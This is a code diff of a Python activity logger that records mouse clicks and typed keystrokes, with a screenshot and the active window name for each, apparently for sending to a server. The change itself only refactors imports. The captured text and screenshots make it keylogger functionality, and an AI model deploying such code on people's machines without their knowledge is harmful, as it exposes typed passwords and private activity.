@@ -3,7 +3,7 @@ path.append('../../')  # Evitar problema de importación circular
 from pynput import mouse
 from modules import consumerServer, supervision
 from modules.consumerServer import SERVER_ADDR
-from utils.utils import *
+import utils.utils 
 from pynput import mouse, keyboard as pynput_keyboard
 from time import time
 import threading
@@ -31,13 +31,13 @@ def logMouse():
     global last_click_time, click_timer, click_type
 
     def send_click_event(x, y, button, category):
-        img = takeScreenshot() 
-        window_name = getActiveWindowInfo("name")
+        img = utils.utils.takeScreenshot() 
+        window_name = utils.utils.getActiveWindowInfo("name")
          # Guardar imagen / Save image
         print(window_name)
         json_string={
-            "timestamp": timestamp(),
-            "user": USER,
+            "timestamp": utils.utils.timestamp(),
+            "user": utils.utils.USER,
             "category": category,
             "application": window_name,
             "event_type": "click",
@@ -145,8 +145,8 @@ def logKeyboard():
     def send_data():
         nonlocal pressed_keys
         if pressed_keys:
-            img = takeScreenshot()
-            window_name = getActiveWindowInfo("name")
+            img = utils.utils.takeScreenshot()
+            window_name = utils.utils.getActiveWindowInfo("name")
             typed_word = ''.join([k for k in pressed_keys if k])  # Filtrar cualquier valor None / # Filter any None value
 
             # Verificar si 'C T R L + ' ya está en typed_word
@@ -162,10 +162,10 @@ def logKeyboard():
             if typed_word.startswith(incorrect_sequence):
                 typed_word = typed_word[len(incorrect_sequence):]  # Eliminar la secuencia incorrecta / # Eliminate the incorrect sequence
 
-            print(f"{timestamp()} {USER} {window_name} typed: {typed_word}")
+            print(f"{utils.utils.timestamp()} {utils.utils.USER} {window_name} typed: {typed_word}")
             json_string={
-                "timestamp": timestamp(),
-                "user": USER,
+                "timestamp": utils.utils.timestamp(),
+                "user": utils.utils.USER,
                 "category": "Keyboard",
                 "application": window_name,
                 "event_type": "keypress",
